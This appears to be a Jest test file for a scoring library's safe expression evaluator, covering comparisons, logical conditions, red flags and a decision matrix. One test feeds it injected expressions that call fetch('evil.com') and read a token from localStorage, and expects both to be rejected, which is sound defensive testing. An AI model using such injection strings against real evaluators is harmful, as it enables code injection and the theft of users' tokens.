import { evaluateRedFlags, evaluateDecisionMatrix, safeEvaluate } from '../../lib/scoring';

describe('Scoring – Safe Expression Evaluation', () => {
  test('evaluates simple comparisons correctly', () => {
    expect(safeEvaluate('score > 80', 85)).toBe(true);
    expect(safeEvaluate('score >= 80', 80)).toBe(true);
    expect(safeEvaluate('score < 30', 25)).toBe(true);
    expect(safeEvaluate('score == 50', 50)).toBe(true);
    expect(safeEvaluate('score != 50', 60)).toBe(true);
  });

  test('handles AND/OR conditions', () => {
    expect(safeEvaluate('score > 50 && score < 75', 60)).toBe(true);
    expect(safeEvaluate('score > 50 && score < 75', 80)).toBe(false);
    expect(safeEvaluate('score < 30 || score > 90', 95)).toBe(true);
  });

  test('rejects unsafe expressions', () => {
    expect(() => safeEvaluate('score > 50; fetch("evil.com")', 60)).toThrow();
    expect(() => safeEvaluate('score > 50; localStorage.getItem("token")', 60)).toThrow();
  });

  test('evaluates red flags correctly', () => {
    const flags = [
      { id: 'f1', condition: 'score > 80', alertMessage: 'High' },
      { id: 'f2', condition: 'score < 30', alertMessage: 'Low' },
    ];
    const triggered = evaluateRedFlags(flags, 85);
    expect(triggered).toHaveLength(1);
    expect(triggered[0].id).toBe('f1');
  });

  test('evaluates decision matrix correctly', () => {
    const matrix = [
      { id: 'm1', condition: 'score >= 75', recommendation: 'Advance' },
      { id: 'm2', condition: 'score >= 40 && score < 75', recommendation: 'Consider' },
      { id: 'm3', condition: 'score < 40', recommendation: 'Reject' },
    ];
    const result = evaluateDecisionMatrix(matrix, 60);
    expect(result).not.toBeNull();
    expect(result?.recommendation).toBe('Consider');
  });
});
